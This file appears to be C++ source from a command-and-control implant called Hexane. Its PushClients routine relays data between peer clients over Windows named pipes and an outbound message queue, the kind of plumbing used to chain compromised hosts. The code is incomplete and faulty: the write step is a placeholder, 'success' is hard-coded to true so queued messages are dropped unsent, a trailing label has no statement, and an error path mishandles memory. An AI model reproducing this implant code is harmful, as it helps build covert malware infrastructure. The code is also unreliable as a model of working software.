#include <core/include/clients.hpp>
namespace Clients {

    VOID PushClients() {
        HEXANE

        // just fucking send it...
        for (auto client = Ctx->clients; client; client = client->next) {
            uint8_t bound = 0;
            uint32_t total  = 0;

            //0 peer_id task_id msg_type buffer
            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                continue;
            }

            if (total >= sizeof(uint32_t)) {
                if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, nullptr, nullptr)) {
                    continue;
                }

                if (bound == 0) {
                    _stream *in     = Stream::CreateStream();
                    void *buffer    = x_malloc(total);

                    if (!in) {
                        continue;
                    }
                    if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, nullptr, nullptr)) {
                        Stream::DestroyStream(in);
                        if (buffer) {
                            x_free(buffer);
                            continue;
                        }
                    }

                    in->buffer = buffer;
                    in->length += total;

                    Dispatcher::OutboundQueue(in);
                }
            }

            for (auto message = Ctx->transport.outbound_queue; message; message = message->next) {

                if (message->buffer && B_PTR(message->buffer)[0] != 0) {
                    if (Dispatcher::PeekPeerId(message) == client->peer_id) {
                        auto success = true;
                        // writing logic

                        if (success) {
                            Dispatcher::RemoveMessage(message);
                        }
                    }
                } else {
                    continue;
                }
            }
        }

        defer:
    }
}